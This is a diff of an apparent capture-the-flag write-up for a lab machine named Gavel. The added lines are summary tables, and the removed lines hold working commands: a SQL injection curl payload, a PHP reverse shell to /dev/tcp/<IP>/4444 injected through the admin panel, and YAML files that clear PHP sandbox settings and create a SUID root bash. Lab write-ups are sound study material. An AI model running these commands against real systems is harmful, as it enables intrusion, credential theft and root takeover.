@@ -427,13 +427,14 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
 ## PHASE 3: The Attack Vector Mechanism
 
-### THE CORE MECHANISM
+| Attribute                       | Technical Details                                                                                                                                 |
+| :------------------------------ | :------------------------------------------------------------------------------------------------------------------------------------------------ |
+| **Primary Entry Points**        | `inventory.php` (`user_id`, `sort` SQLi), `admin.php` rule field (dynamic PHP execution), `/usr/local/bin/gavel-util` YAML `rule` processing.     |
+| **Key Vulnerabilities**         | Unsanitized SQL queries; unsafe PHP `runkit_function_add()` usage; YAML-driven PHP execution with root privileges.                                |
+| **Attack Flow**                 | SQLi → credential theft → admin panel RCE → reverse shell → password reuse → YAML-based PHP config overwrite → SUID binary creation → root shell. |
+| **Privilege Escalation Vector** | Root-owned utility executing attacker-controlled YAML with embedded PHP logic.                                                                    |
+| **Impact**                      | Full system compromise with persistent root-level access.                                                                                         |
 
-| Attribute | Technical Details |
-|  |  |
-| **Primary Identifiers** | `inventory.php?user_id`, `sort` parameters; `admin.php` rule field (`runkit_function_add()`); `/usr/local/bin/gavel-util` YAML `rule` field. |
-| **Critical Vulnerability** | Unsanitized SQL query in `inventory.php`; dynamic PHP code execution via runkit; YAML parser executing arbitrary PHP code with elevated privileges. |
-| **Offensive Action** | 1) Inject backtick‑delimited payload to read users table and extract bcrypt hash. 2) Use stolen credentials to log into admin panel. 3) Insert reverse shell code in rule field (`system('bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"')`). 4) Trigger rule via `bid_handler.php`. 5) Stabilize shell, `su auctioneer` using reused password. 6) Craft two YAML files: one to overwrite `php.ini`, another to copy `/bin/bash` and set SUID bit. 7) Execute SUID binary with `-p` flag for root shell.
 
 ### Prerequisites
 
@@ -531,23 +532,22 @@ Heartbeat
 
 
 
-## Quick Action Playbook
+| Step | User / Access              | Technique Used                          | Result                                                                    |
+| :--: | :------------------------- | :-------------------------------------- | :------------------------------------------------------------------------ |
+|   1  | (Local / Recon)            | **Full Port Scan (nmap)**               | Identified open ports `22` (SSH) and `80` (HTTP) on target.               |
+|   2  | (Unauthenticated Web)      | **Directory Fuzzing (ffuf)**            | Discovered accessible application paths and confirmed web attack surface. |
+|   3  | (Local / Analysis)         | **Exposed Git Repository Dump**         | Cloned `.git` directory and recovered full application source code.       |
+|   4  | (Unauthenticated Web)      | **SQL Injection (inventory.php)**       | Extracted `users` table contents, including bcrypt password hash.         |
+|   5  | (Attacker)                 | **Offline Hash Cracking (bcrypt)**      | Cracked hash using `rockyou.txt`, revealing password `midXXXXXX`.         |
+|   6  | auth admin (Web Panel)     | **Authenticated RCE (Rule Injection)**  | Logged into admin panel and injected PHP reverse shell payload.           |
+|   7  | www-data (Web Exec)        | **Rule Trigger via bid_handler.php**    | Triggered malicious rule, resulting in reverse shell access.              |
+|   8  | www-data (Shell)           | **Shell Stabilization**                 | Upgraded to interactive TTY for reliable command execution.               |
+|   9  | auctioneer (Local User)    | **Credential Reuse / User Switch**      | Switched to `auctioneer` using cracked password.                          |
+|  10  | auctioneer (Priv-esc prep) | **PHP Sandbox Bypass (YAML Injection)** | Overwrote `php.ini`, disabling `open_basedir` and `disable_functions`.    |
+|  11  | auctioneer (Priv-esc)      | **SUID Binary Creation via YAML**       | Copied `/bin/bash` to `/opt/rootbash` and set SUID bit.                   |
+|  12  | root (Effective UID)       | **SUID Bash Execution**                 | Executed `/opt/rootbash -p` to obtain root shell.                         |
+|  13  | root                       | **Flag Retrieval**                      | Read `/root/root.txt`.                                                    |
 
-| Step | Objective | Technical Command / Logic |
-|  |  |  |
-| **01** | Enumerate open ports | `nmap -sV -p- 10.129.4.66` |
-| **02** | Discover hidden directories | `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://gavel.htb/FUZZ -e .php` |
-| **03** | Clone exposed Git repo | `git-dumper http://gavel.htb/.git/ ./gavel-source` |
-| **04** | SQLi payload for credential dump | `curl 'http://gavel.htb/inventory.php?user_id=x\`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+%27x%27+FROM+users)y;--+-&sort=\?;--+-%00' -o out.html` |
-| **05** | Crack bcrypt hash | `john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` |
-| **06** | Admin login & RCE injection | `curl -b "PHPSESSID=<cookie>" -d 'rule=system(\"bash -c \\\"bash -i >& /dev/tcp/<IP>/4444 0>&1\\\"\"); return true;' http://gavel.htb/admin.php` |
-| **07** | Trigger rule via bid handler | `curl -X POST http://gavel.htb/includes/bid_handler.php -H 'Cookie: PHPSESSID=<cookie>' -d 'auction_id=1&bid_amount=50000'` |
-| **08** | Stabilize shell | `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` |
-| **09** | Switch to auctioneer | `su auctioneer` (password: midXXXXXX) |
-| **10** | Disable PHP sandbox via YAML | `cat > fix_ini.yaml <<EOF\nname: fixini\ndescription: fix php ini\nimage: \"x.png\"\nprice: 1\nrule_msg: \"fixini\"\nrule: file_put_contents('/opt/.config/php/php.ini', \"engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;\nEOF`<br>`/usr/local/bin/gavel-util submit fix_ini.yaml` |
-| **11** | Create SUID bash via YAML | `cat > rootshell.yaml <<EOF\nname: rootshell\ndescription: make suid bash\nimage: \"x.png\"\nprice: 1\nrule_msg: \"rootshell\"\nrule: system('cp /bin/bash /opt/rootbash; chmod u+s /opt/rootbash'); return false;\nEOF`<br>`/usr/local/bin/gavel-util submit rootshell.yaml` |
-| **12** | Execute SUID binary | `/opt/rootbash -p` |
-| **13** | Retrieve root flag | `cat /root/root.txt` |
 
 
 **Thanks you for read!**
